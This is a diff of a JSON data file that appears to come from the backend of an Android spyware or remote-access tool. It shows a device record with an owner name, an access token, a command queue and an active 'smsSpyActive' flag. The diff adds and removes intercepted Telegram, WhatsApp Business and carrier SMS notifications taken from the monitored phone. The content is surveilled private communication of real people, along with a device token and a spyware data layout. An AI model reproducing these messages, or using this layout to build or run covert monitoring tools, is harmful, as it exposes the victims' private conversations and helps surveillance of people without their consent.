@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632344954,
+    "lastSeen": 1775632357090,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632358419
+      },
+      {
+        "appName": "Telegram",
+        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
+        "content": "enggaa",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632358342
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "10 new messages from 10 chats",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632358089
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632347201
+      },
+      {
+        "appName": "Telegram",
+        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
+        "content": "enggaa",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632347146
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Kalo gak mw ywd",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632347092
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4278,54 +4326,6 @@
         "time": "08/04 13:30",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775629805493
-      },
-      {
-        "appName": "WA Business",
-        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
-        "content": "~ NeonsAtrm: Ga dlu kalo di suruh pm Luan, kenon ☠️🥱",
-        "time": "08/04 13:30",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775629805041
-      },
-      {
-        "appName": "Messages",
-        "sender": "XL",
-        "content": "(XL) Kuota Area Bebas Puas kamu saat ini kurang dari 196.00MB. Cek kuota berkala di aplikasi myXL atau *808#. Info: xl.co.id/LC",
-        "time": "08/04 13:30",
-        "pkg": "com.google.android.apps.messaging",
-        "receivedAt": 1775629801258
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝐒𝐌𝐒𝐏𝐚𝐧𝐞𝐥",
-        "content": "gass kan lagi free gift nft\nhttp://t.me/nft/PoolFloat-37532\n\ncara ikuti? \n- /start bot\n- share bot+channel\n- follow channel: https://t.me/BELIIIGIFTT\nhttps://t.me/MerchantTgGift\n\n\nshare kan bot:\n@appsPrermmm_bot\n@appremmshaca_bot",
-        "time": "08/04 13:28",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775629731064
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎6 pesan dari 2 chat",
-        "time": "08/04 13:28",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775629725685
-      },
-      {
-        "appName": "WA Business",
-        "sender": "‎𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏 (3 pesan): Membalas Anda",
-        "content": "~ sfr: Gak tau bangsat",
-        "time": "08/04 13:28",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775629725580
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎5 pesan dari 2 chat",
-        "time": "08/04 13:28",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775629709920
       }
     ],
     "galleryPhotos": [],
